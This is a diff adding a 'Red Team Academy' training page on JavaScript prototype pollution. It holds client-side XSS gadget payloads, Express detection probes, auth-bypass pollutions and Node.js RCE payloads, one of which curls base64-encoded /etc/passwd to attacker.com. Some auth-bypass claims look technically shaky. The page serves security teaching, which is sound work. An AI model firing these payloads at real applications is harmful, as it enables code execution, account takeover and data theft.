@@ -1,0 +1,128 @@
+---
+import TrainingPage from '../../layouts/TrainingPage.astro';
+---
+<TrainingPage
+  title="Prototype Pollution — Red Team Academy"
+  module="Web Hacking"
+  tags={['prototype-pollution', 'nodejs', 'client-side', 'rce', 'express']}
+  pageKey="web-prototype-pollution"
+>
+  <h1>Prototype Pollution</h1>
+  <p>Prototype pollution abuses JavaScript's prototype chain — by injecting properties into <code>Object.prototype</code>, every object in the application inherits the injected property. Client-side: leads to XSS via DOM gadgets. Server-side (Node.js): leads to RCE, auth bypass, and denial of service.</p>
+
+  <h2>How It Works</h2>
+  <pre><code># JavaScript prototype chain:
+# Every object inherits from Object.prototype
+# Polluting Object.prototype affects ALL objects
+
+# Example:
+let obj = &#123;&#125;;
+obj.__proto__.polluted = "yes";
+console.log(&#123;&#125;.polluted);  // → "yes" — every empty object has it now
+console.log([].polluted);   // → "yes" — arrays too
+
+# Vulnerable merge function (common pattern):
+function merge(target, source) &#123;
+  for (let key in source) &#123;
+    target[key] = source[key];  // no hasOwnProperty check!
+  &#125;
+&#125;
+merge(&#123;&#125;, JSON.parse('&#123;"__proto__": &#123;"isAdmin": true&#125;&#125;'));
+console.log(&#123;&#125;.isAdmin);  // → true (POLLUTED)</code></pre>
+
+  <h2>Client-Side Prototype Pollution</h2>
+  <pre><code># Sources (user-controlled input that flows into merge/clone):
+# URL parameters: ?__proto__[polluted]=value
+# URL hash: #__proto__[polluted]=value
+# JSON body: &#123;"__proto__":&#123;"polluted":"value"&#125;&#125;
+
+# Detection — try injecting via URL:
+https://target/?__proto__[testprop]=polluted
+# Then in browser console:
+Object.prototype.testprop  // → "polluted" = vulnerable
+
+# Constructor-based alternative (bypasses some filters):
+?constructor[prototype][testprop]=polluted
+?__proto__[testprop]=polluted
+
+# Gadgets (built-in browser/jQuery behaviors triggered by polluted props):
+# jQuery gadgets:
+# innerHTML: ?__proto__[innerHTML]=&lt;img src=1 onerror=alert(1)&gt;
+# html() gadget: ?__proto__[html]=&lt;script&gt;alert(1)&lt;/script&gt;
+# jQuery &lt;1.9: $.each() → XSS via polluted selector
+
+# DOM gadget hunting:
+# Look for code like: element.innerHTML = options.template
+# If options comes from polluted object: pollute "template" property
+
+# PP2XSS — automated client-side gadget finder:
+# https://github.com/BlackFan/client-side-prototype-pollution</code></pre>
+
+  <h2>Server-Side Prototype Pollution (Node.js)</h2>
+  <pre><code># Vulnerable patterns in Node.js:
+# 1. Lodash merge (lodash &lt;4.17.21 — CVE-2019-10744):
+const _ = require('lodash');
+_.merge(&#123;&#125;, JSON.parse(userInput));  // pollutes Object.prototype
+
+# 2. jQuery extend (server-side):
+$.extend(true, &#123;&#125;, JSON.parse(userInput));
+
+# 3. Manual deep merge without hasOwnProperty:
+# → Object.prototype.polluted = attacker_value
+
+# Detection via JSON body:
+POST /api/user/settings
+Content-Type: application/json
+&#123;"__proto__": &#123;"json spaces": 10&#125;&#125;
+
+# If response JSON is pretty-printed with 10 spaces → vulnerable
+# (Express uses "json spaces" property from process.env / req.app.settings)
+
+# Other detectable properties:
+&#123;"__proto__": &#123;"status": 510&#125;&#125;   # if HTTP 510 returned → vulnerable
+&#123;"__proto__": &#123;"exposedHeaders": ["X-PP-Test"]&#125;&#125;  # check CORS headers</code></pre>
+
+  <h2>PP to RCE via Child Process</h2>
+  <pre><code># Node.js child_process.spawn uses options.env and options.shell
+# Polluting "shell" enables arbitrary command execution:
+
+# If application spawns child processes after parsing polluted input:
+&#123;"__proto__": &#123;"shell": "node", "NODE_OPTIONS": "--require /proc/self/cmdline"&#125;&#125;
+
+# Polluting execArgv:
+&#123;"__proto__": &#123;"execArgv": ["--eval", "require('child_process').exec('id|curl http://attacker.com/rce?d=$(cat /etc/passwd|base64)')"]&#125;&#125;
+
+# CVE-2022-1537 (Grunt) — PP to RCE via file system operations:
+# Grunt's file.copy doesn't sanitize __proto__ in options
+
+# PP in ejs (Express template engine) → RCE:
+# Inject "outputFunctionName" or "escape" into Object.prototype
+&#123;"__proto__": &#123;"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"&#125;&#125;
+
+# pp-finder — automated Node.js PP gadget finder:
+# https://github.com/nicolo-ribaudo/pp-finder</code></pre>
+
+  <h2>PP to Auth Bypass</h2>
+  <pre><code># Admin check pattern:
+if (user.isAdmin) &#123; /* allow */ &#125;
+# Pollute: &#123;"__proto__": &#123;"isAdmin": true&#125;&#125;
+# → every new object has isAdmin=true
+
+# Permission check:
+if (req.user.permissions.includes('admin')) &#123; &#125;
+# Pollute includes():
+&#123;"__proto__": &#123;"includes": &#123;&#125;&#125;&#125;  # make includes always truthy
+
+# Null check bypass:
+if (!user.banned) &#123; /* allow */ &#125;
+# Object.prototype.banned = false (already is, but can override to undefined/false)</code></pre>
+
+  <h2>Tools &amp; Resources</h2>
+  <ul>
+    <li>Burp Suite — Hackvertor extension for encoding payloads</li>
+    <li>client-side-prototype-pollution — <code>github.com/BlackFan/client-side-prototype-pollution</code></li>
+    <li>server-side-prototype-pollution — <code>github.com/nicolo-ribaudo/pp-finder</code></li>
+    <li>PortSwigger PP labs — <code>portswigger.net/web-security/prototype-pollution</code></li>
+    <li>PP scanner Burp extension — "Server-Side Prototype Pollution Scanner"</li>
+  </ul>
+</TrainingPage>
